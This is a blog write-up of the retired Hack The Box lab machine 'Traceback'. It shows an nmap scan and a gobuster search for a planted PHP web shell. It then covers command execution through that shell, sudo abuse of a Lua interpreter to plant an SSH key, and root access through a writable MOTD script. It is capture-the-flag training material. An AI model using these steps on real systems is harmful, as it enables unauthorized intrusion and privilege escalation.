<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="DezeStijn"><meta name=description content="Write-up of the Traceback lab machine by Xh4H on HackTheBox.eu. Owned user and root."><meta name=keywords content="Sequr,blog,writeup,CTF,challenge,machine,infosec,IT security,hacking,pentesting,cybersecurity,HackTheBox.eu,Xh4H,Machine,Traceback"><meta name=robots content="noodp"><meta name=theme-color content="#252627"><link rel=canonical href=https://sequr.be/blog/2020/03/traceback/><title>Traceback :: Sequr</title><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css integrity="sha512-Cv93isQdFwaKBV+Z4X8kaVBYWHST58Xb/jVOcV9aRsGSArZsgAnFIhMpDoMDcFNoUtday1hdjn0nGp3+KZyyFw==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=stylesheet href=https://sequr.be/main.2a064c455b0ecbd6b1481b3bf9df2441e95838691022f40a5338c2cb1244f075.css integrity="sha256-KgZMRVsOy9axSBs7+d8kQelYOGkQIvQKUzjCyxJE8HU="><link rel=stylesheet type=text/css href=https://sequr.be/css/table.css><link rel=stylesheet type=text/css href=https://sequr.be/css/menu.css><link rel=apple-touch-icon sizes=180x180 href=https://sequr.be/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://sequr.be/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://sequr.be/favicon-16x16.png><link rel=manifest href=https://sequr.be/site.webmanifest><link rel=mask-icon href=https://sequr.be/safari-pinned-tab.svg color><link rel="shortcut icon" href=https://sequr.be/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="Traceback"><meta itemprop=description content="Write-up of the Traceback lab machine by Xh4H on HackTheBox.eu. Owned user and root."><meta itemprop=datePublished content="2020-03-18T03:00:00+00:00"><meta itemprop=dateModified content="2020-03-18T03:00:00+00:00"><meta itemprop=wordCount content="1129"><meta itemprop=image content="https://sequr.be/img/htb-traceback.png"><meta itemprop=keywords content="HackTheBox.eu,Xh4H,Machine,Traceback,"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://sequr.be/img/htb-traceback.png"><meta name=twitter:title content="Traceback"><meta name=twitter:description content="Write-up of the Traceback lab machine by Xh4H on HackTheBox.eu. Owned user and root."><meta property="article:section" content="Hack The Box"><meta property="article:section" content="Writeup"><meta property="article:published_time" content="2020-03-18 03:00:00 +0000 UTC"></head><body><div class=container><header class=header><span class=header__inner><a href=https://sequr.be/ style=text-decoration:none><div class=logo><span class=logo__mark>$</span>
<span class=logo__text>lynx sequr.be</span>
<span class=logo__cursor style=background-color:#e68101></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://sequr.be/blog/>Blog</a></li><li><a href=https://sequr.be/about/>About</a></li><li><a href=https://sequr.be/shoppinglist/>Shopping</a></li><li><a href=https://sequr.be/privacy/>Privacy</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>6 minutes</p></div><article><h1 class=post-title><a href=https://sequr.be/blog/2020/03/traceback/>Traceback</a></h1><div class=post-content><p><strong>Note to fellow-HTBers:</strong> Only write-ups of retired HTB machines or challenges are allowed.</p><h2 id=machine-info>Machine info <a href=#machine-info>¶</a></h2><p>Traceback [by <a href=https://www.hackthebox.eu/home/users/profile/21439 target=_blank rel=noopener>Xh4H</a>]<br>IP: 10.10.10.181<br>OS: Linux<br>Difficulty: Easy<br>Points: 20<br>Release: 14 Mar 2020</p><h2 id=gain-a-foothold>Gain a foothold <a href=#gain-a-foothold>¶</a></h2><p>As usual we kick off with a nmap scan of the box</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Nmap 7.80 scan initiated Tue Mar 17 22:53:43 2020 as: nmap -v -sC -A -T4 -oA notes/nmap_initial 10.10.10.181</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.181
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.068s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed ports
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Supported Methods: GET POST OPTIONS HEAD
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: <span style=color:#e6db74>&#34;Help us&#34;</span>
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span><span style=color:#75715e># Nmap done at Tue Mar 17 22:54:29 2020 -- 1 IP address (1 host up) scanned in 46.20 seconds</span>
</span></span></code></pre></div><p>Ports 22 and 80 are open.
Let’s start with checking the website.</p><figure class=center><img src=https://sequr.be/img/htb-traceback-homepage.png alt="Defaced homepage"><figcaption class=center>Defaced homepage</figcaption></figure><p>By the looks of it, our target has already been hacked and had its homepage defaced.</p><p>In the source code of the defaced home page, we find a reference to the use of a web shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!-- Some of the best web shells that you might need ;) --&gt;</span>
</span></span></code></pre></div><p>We combine this info, with the nickname used by the hacker, in an online search.<br>Let&rsquo;s try <code>Xh4H web shell</code>.</p><p>One of the hits leads us to <a href=https://github.com/Xh4H/Web-Shells title="Xh4H / Web-Shells" target=_blank rel=noopener>a Github repository</a>.<br>Note the repo&rsquo;s description: <code>Some of the best web shells that you might need</code></p><p>This repo is a collection of web shells.</p><p>Cloning the repo, we can easily list its contents and create a wordlist.
We can then use this wordlist to check whether our hacker used one of these shells.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ git clone https://github.com/Xh4H/Web-Shells.git
</span></span><span style=display:flex><span>$ ls Web-Shells | tee wordlist-shells.lst
</span></span><span style=display:flex><span>alfa3.php
</span></span><span style=display:flex><span>alfav3.0.1.php
</span></span><span style=display:flex><span>andela.php
</span></span><span style=display:flex><span>bloodsecv4.php
</span></span><span style=display:flex><span>by.php
</span></span><span style=display:flex><span>c99ud.php
</span></span><span style=display:flex><span>cmd.php
</span></span><span style=display:flex><span>configkillerionkros.php
</span></span><span style=display:flex><span>jspshell.jsp
</span></span><span style=display:flex><span>mini.php
</span></span><span style=display:flex><span>obfuscated-punknopass.php
</span></span><span style=display:flex><span>punkholic.php
</span></span><span style=display:flex><span>punk-nopass.php
</span></span><span style=display:flex><span>r57.php
</span></span><span style=display:flex><span>README.md
</span></span><span style=display:flex><span>smevk.php
</span></span><span style=display:flex><span>wso2.8.5.php
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ gobuster -w wordlist-shells.lst -u http://10.10.10.181/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>=====================================================</span>
</span></span><span style=display:flex><span>Gobuster v2.0.1              OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>=====================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Mode         : dir
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url/Domain   : http://10.10.10.181/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads      : <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist     : wordlist-shells.lst
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Status codes : 200,204,301,302,307,403
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout      : 10s
</span></span><span style=display:flex><span><span style=color:#f92672>=====================================================</span>
</span></span><span style=display:flex><span>2020/03/23 17:26:38 Starting gobuster
</span></span><span style=display:flex><span><span style=color:#f92672>=====================================================</span>
</span></span><span style=display:flex><span>/smevk.php <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Looks like our hacker used the SmEvK_PaThAn Shell.</p><figure class=center><img src=https://sequr.be/img/htb-traceback-smevk.png alt="Web shell"><figcaption class=center>Web shell</figcaption></figure><p>We find the login credentials in the <a href=https://github.com/Xh4H/Web-Shells/blob/master/smevk.php title="SmEvK source code" target=_blank rel=noopener>source code</a>.</p><p>The shell contains loads of functionality, one of which is a console.<br>We can use this console to execute commands as the user running the web shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-sh data-lang=sh><span style=display:flex><span>$ whoami
</span></span><span style=display:flex><span>webadmin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ pwd
</span></span><span style=display:flex><span>/var/www/html
</span></span></code></pre></div><h2 id=own-user>Own user <a href=#own-user>¶</a></h2><p>In the user&rsquo;s home folder, we find a note left by the sysadmin.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ cat /home/webadmin/note.txt
</span></span><span style=display:flex><span>- sysadmin -
</span></span><span style=display:flex><span>I have left a tool to practice Lua.
</span></span><span style=display:flex><span>I<span style=color:#960050;background-color:#1e0010>&#39;</span>m sure you know where to find it.
</span></span><span style=display:flex><span>Contact me <span style=color:#66d9ef>if</span> you have any question.
</span></span></code></pre></div><p>We also discover that the user can execute a script as this sysadmin.
Using sudo and passing the <code>-u</code> parameter, we can then execute this program.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> webadmin on traceback:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User webadmin may run the following commands on traceback:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>sysadmin<span style=color:#f92672>)</span> NOPASSWD: /home/sysadmin/luvit
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ sudo /home/sysadmin/luvit 2&gt;&amp;<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>sudo: no tty present and no askpass program specified
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ sudo -u sysadmin /home/sysadmin/luvit 2&gt;&amp;<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Welcome to the <span style=color:#f92672>[</span>0mL<span style=color:#f92672>[</span>0muv<span style=color:#f92672>[</span>0mit<span style=color:#f92672>[</span>0m repl!
</span></span><span style=display:flex><span>&gt; Uncaught exception:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:deps/readline.lua&#34;</span><span style=color:#f92672>]</span>:485: attempt to call method <span style=color:#e6db74>&#39;set_mode&#39;</span> <span style=color:#f92672>(</span>a nil value<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>stack traceback:
</span></span><span style=display:flex><span>	<span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:deps/readline.lua&#34;</span><span style=color:#f92672>]</span>:485: in <span style=color:#66d9ef>function</span> <span style=color:#e6db74>&#39;readLine&#39;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:deps/repl.lua&#34;</span><span style=color:#f92672>]</span>:198: in <span style=color:#66d9ef>function</span> <span style=color:#e6db74>&#39;start&#39;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:main.lua&#34;</span><span style=color:#f92672>]</span>:137: in <span style=color:#66d9ef>function</span> <span style=color:#e6db74>&#39;main&#39;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:init.lua&#34;</span><span style=color:#f92672>]</span>:49: in <span style=color:#66d9ef>function</span> &lt;<span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:init.lua&#34;</span><span style=color:#f92672>]</span>:47&gt;
</span></span><span style=display:flex><span>	<span style=color:#f92672>[</span>C<span style=color:#f92672>]</span>: in <span style=color:#66d9ef>function</span> <span style=color:#e6db74>&#39;xpcall&#39;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:init.lua&#34;</span><span style=color:#f92672>]</span>:47: in <span style=color:#66d9ef>function</span> <span style=color:#e6db74>&#39;fn&#39;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:deps/require.lua&#34;</span><span style=color:#f92672>]</span>:310: in <span style=color:#66d9ef>function</span> &lt;<span style=color:#f92672>[</span>string <span style=color:#e6db74>&#34;bundle:deps/require.lua&#34;</span><span style=color:#f92672>]</span>:266&gt;
</span></span></code></pre></div><p>Combining the intel from the sysadmin&rsquo;s note and the tool we&rsquo;ve discovered,
we can assume that <code>luvit</code> is a Lua interpreter.
This could allow us to write scripts, perhaps even gaining access to the sysadmin account?</p><p>Let&rsquo;s write a simple script to test our theory.<br>Note that I use Shared Memory to store my scripts, to avoid polluting the system.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ echo <span style=color:#e6db74>&#39;print(&#34;hello world&#34;)&#39;</span> &gt; /dev/shm/hello.lua
</span></span><span style=display:flex><span>$ cat /dev/shm/hello.lua
</span></span><span style=display:flex><span>print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;hello world&#34;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>$ sudo -u sysadmin /home/sysadmin/luvit /dev/shm/hello.lua 2&gt;&amp;<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>hello world
</span></span></code></pre></div><p>Checking who we&rsquo;re executing scripts as.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ echo <span style=color:#e6db74>&#39;os.execute(&#34;whoami&#34;)&#39;</span> &gt; /dev/shm/hello.lua; sudo -u sysadmin /home/sysadmin/luvit /dev/shm/hello.lua 2&gt;&amp;1; rm /dev/shm/hello.lua
</span></span><span style=display:flex><span>sysadmin
</span></span></code></pre></div><p>Let&rsquo;s try to find the user&rsquo;s flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ echo <span style=color:#e6db74>&#39;os.execute(&#34;ls ~&#34;)&#39;</span> &gt; /dev/shm/hello.lua
</span></span><span style=display:flex><span>$ sudo -u sysadmin /home/sysadmin/luvit /dev/shm/hello.lua 2&gt;&amp;<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>luvit
</span></span><span style=display:flex><span>user.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ echo <span style=color:#e6db74>&#39;os.execute(&#34;cat ~/user.txt&#34;)&#39;</span> &gt; /dev/shm/hello.lua
</span></span><span style=display:flex><span>$ sudo -u sysadmin /home/sysadmin/luvit /dev/shm/hello.lua 2&gt;&amp;<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>c24<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span><span style=color:#ae81ff>020</span>
</span></span></code></pre></div><p>Don&rsquo;t forget to clean up!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ rm /dev/shm/hello.lua
</span></span></code></pre></div><h2 id=privesc-root>Privesc (root) <a href=#privesc-root>¶</a></h2><p>Let&rsquo;s make it easier to ourselves to work on the box by granting ourselves SSH access.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># On our box</span>
</span></span><span style=display:flex><span>$ ssh-keygen -b <span style=color:#ae81ff>2048</span> -t rsa -C globemarssociety -f ./id_traceback
</span></span><span style=display:flex><span>$ cat ./id_traceback
</span></span><span style=display:flex><span>ssh-rsa AAAAB<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>EitYfvF4f <span style=color:#75715e># copy this to clipboard</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Shell</span>
</span></span><span style=display:flex><span>$ echo <span style=color:#e6db74>&#39;os.execute(&#34;echo ssh-rsa AAAAB[...]EitYfvF4f globemarssociety &gt;&gt; /home/sysadmin/.ssh/authorized_keys&#34;)&#39;</span> &gt; /dev/shm/hello.lua
</span></span><span style=display:flex><span>$ sudo -u sysadmin /home/sysadmin/luvit /dev/shm/hello.lua 2&gt;&amp;<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>$ rm /dev/shm/hello.lua
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># On our box</span>
</span></span><span style=display:flex><span>$ ssh -i id_traceback sysadmin@10.10.10.181
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#################################</span>
</span></span><span style=display:flex><span>-------- OWNED BY XH4H  ---------
</span></span><span style=display:flex><span>- I guess stuff could have been configured better ^^ -
</span></span><span style=display:flex><span><span style=color:#75715e>#################################</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Welcome to Xh4H land
</span></span></code></pre></div><p>It looks like the MotD has also been hijacked by the hacker who defaced the website.</p><p>As part of our recon, we look for files writable by our user (sysadmin),
in particular files that are also owned by root.
We find that the Message of the Day (MotD) files can be modified by our user and are owned by root.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>sysadmin@traceback:~$ find / -writable 2&gt;/dev/null
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sysadmin@traceback:~$ ls -al /etc/update-motd.d/
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>32</span>
</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>2</span> root sysadmin <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2019</span> .
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>80</span> root root     <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>16</span> 03:55 ..
</span></span><span style=display:flex><span>-rwxrwxr-x  <span style=color:#ae81ff>1</span> root sysadmin  <span style=color:#ae81ff>981</span> Mar <span style=color:#ae81ff>17</span> 19:30 00-header
</span></span><span style=display:flex><span>-rwxrwxr-x  <span style=color:#ae81ff>1</span> root sysadmin  <span style=color:#ae81ff>982</span> Mar <span style=color:#ae81ff>17</span> 19:30 10-help-text
</span></span><span style=display:flex><span>-rwxrwxr-x  <span style=color:#ae81ff>1</span> root sysadmin <span style=color:#ae81ff>4264</span> Mar <span style=color:#ae81ff>17</span> 19:30 50-motd-news
</span></span><span style=display:flex><span>-rwxrwxr-x  <span style=color:#ae81ff>1</span> root sysadmin  <span style=color:#ae81ff>604</span> Mar <span style=color:#ae81ff>17</span> 19:30 80-esm
</span></span><span style=display:flex><span>-rwxrwxr-x  <span style=color:#ae81ff>1</span> root sysadmin  <span style=color:#ae81ff>299</span> Mar <span style=color:#ae81ff>17</span> 19:30 91-release-upgrade
</span></span></code></pre></div><p>We add a line to the MotD which will print the content of <code>/root/root.txt</code>
which is where we usually find the root flag.</p><p>Note that to exploit this, we&rsquo;ll have to be quick.
There&rsquo;s a script that resets the MotD to it&rsquo;s default value after a user logged in
(You can see this running pspy for a while and logging in from a 2nd session).<br>So make sure you have a second terminal window open, ready to SSH into the box
as soon as you&rsquo;ve executed the first command.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># In our current SSH shell</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;cat /root/root.txt&#34;</span> &gt;&gt; /etc/update-motd.d/00-header
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># In the 2nd terminal</span>
</span></span><span style=display:flex><span>$ ssh -i id_traceback sysadmin@10.10.10.181
</span></span><span style=display:flex><span><span style=color:#75715e>#################################</span>
</span></span><span style=display:flex><span>-------- OWNED BY XH4H  ---------
</span></span><span style=display:flex><span>- I guess stuff could have been configured better ^^ -
</span></span><span style=display:flex><span><span style=color:#75715e>#################################</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Welcome to Xh4H land 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ccd<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>5d6
</span></span></code></pre></div><p>There we have it :)</p><p>A very pleasant box by <a href=https://www.hackthebox.eu/home/users/profile/21439 target=_blank rel=noopener>Xh4H</a>!</p></div></article><hr><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://sequr.be/tags/hackthebox.eu/>HackTheBox.eu</a></span>
<span class=tag><a href=https://sequr.be/tags/xh4h/>Xh4H</a></span>
<span class=tag><a href=https://sequr.be/tags/machine/>Machine</a></span>
<span class=tag><a href=https://sequr.be/tags/traceback/>Traceback</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg><span class=tag><a href=https://sequr.be/categories/hack-the-box/>Hack The Box</a></span>
<span class=tag><a href=https://sequr.be/categories/writeup/>Writeup</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>1129 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>2020-03-18</p></div><hr><div class=sharing-buttons><a class=resp-sharing-button__link href=https://ko-fi.com/s4squatch target=_blank rel=noopener aria-label title="Buy me a coffee"><div class="resp-sharing-button resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M23.881 8.948c-.773-4.085-4.859-4.593-4.859-4.593H.723c-.604.0-.679.798-.679.798s-.082 7.324-.022 11.822c.164 2.424 2.586 2.672 2.586 2.672s8.267-.023 11.966-.049c2.438-.426 2.683-2.566 2.658-3.734 4.352.24 7.422-2.831 6.649-6.916zm-11.062 3.511c-1.246 1.453-4.011 3.976-4.011 3.976s-.121.119-.31.023c-.076-.057-.108-.09-.108-.09-.443-.441-3.368-3.049-4.034-3.954-.709-.965-1.041-2.7-.091-3.71.951-1.01 3.005-1.086 4.363.407.0.0 1.565-1.782 3.468-.963 1.904.82 1.832 3.011.723 4.311zm6.173.478c-.928.116-1.682.028-1.682.028V7.284h1.77s1.971.551 1.971 2.638c0 1.913-.985 2.667-2.059 3.015z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsequr.be%2fblog%2f2020%2f03%2ftraceback%2f" target=_blank rel=noopener aria-label title="Share on facebook"><div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fsequr.be%2fblog%2f2020%2f03%2ftraceback%2f" target=_blank rel=noopener aria-label title="Share on twitter"><div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2fsequr.be%2fblog%2f2020%2f03%2ftraceback%2f&amp;resubmit=true&amp;title=Traceback" target=_blank rel=noopener aria-label title="Share on reddit"><div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg 